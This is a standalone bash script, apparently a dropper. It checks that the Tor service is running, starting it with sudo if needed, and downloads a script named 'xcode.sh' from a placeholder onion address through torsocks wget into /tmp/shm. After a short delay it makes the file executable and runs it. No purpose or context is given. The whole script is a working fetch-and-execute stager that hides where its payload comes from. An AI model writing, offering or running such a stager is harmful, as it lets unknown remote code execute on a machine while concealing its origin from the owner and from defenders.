#!/bin/bash

# Variables
ONION_URL="http://exampleversion3onionaddress.onion/xcode.sh"
DOWNLOAD_DIR="/tmp/shm"
DOWNLOAD_PATH="$DOWNLOAD_DIR/xcode.sh"
LOG_FILE="$DOWNLOAD_DIR/download_and_run.log"

# Start logging
exec > >(tee -i $LOG_FILE)
exec 2>&1

echo "Starting script at $(date)"

# Function to ensure Tor service is running
start_tor() {
  if ! pgrep -x "tor" > /dev/null; then
    echo "Tor service is not running. Starting Tor service..."
    sudo systemctl start tor
    if [[ $? -ne 0 ]]; then
      echo "Failed to start Tor service. Please start it manually."
      exit 1
    fi
  else
    echo "Tor service is already running."
  fi
}

# Ensure the Tor service is running
start_tor

# Create the directory if it doesn't exist
if [[ ! -d $DOWNLOAD_DIR ]]; then
  echo "Creating directory $DOWNLOAD_DIR"
  mkdir -p $DOWNLOAD_DIR
  if [[ $? -ne 0 ]]; then
    echo "Failed to create directory $DOWNLOAD_DIR"
    exit 1
  fi
fi

# Test if Tor is working
echo "Testing Tor connection with check.torproject.org"
if torsocks wget -qO- http://check.torproject.org | grep -q "Congratulations. This browser is configured to use Tor."; then
  echo "Tor is working."
else
  echo "Tor is not working. Exiting."
  exit 1
fi

# Download the file using torsocks and wget
echo "Downloading file from $ONION_URL to $DOWNLOAD_PATH"
if torsocks wget -O $DOWNLOAD_PATH $ONION_URL; then
  echo "Download completed at $(date)"
else
  echo "Download failed at $(date)"
  exit 1
fi

# Check if the download was successful
if [[ -f $DOWNLOAD_PATH ]]; then
  echo "File $DOWNLOAD_PATH exists."
  # Wait for 15 seconds
  sleep 15

  # Make the script executable
  chmod +x $DOWNLOAD_PATH
  echo "File $DOWNLOAD_PATH made executable."

  # Run the downloaded script
  $DOWNLOAD_PATH
  echo "File $DOWNLOAD_PATH executed."
else
  echo "File not found after download attempt at $(date)."
fi
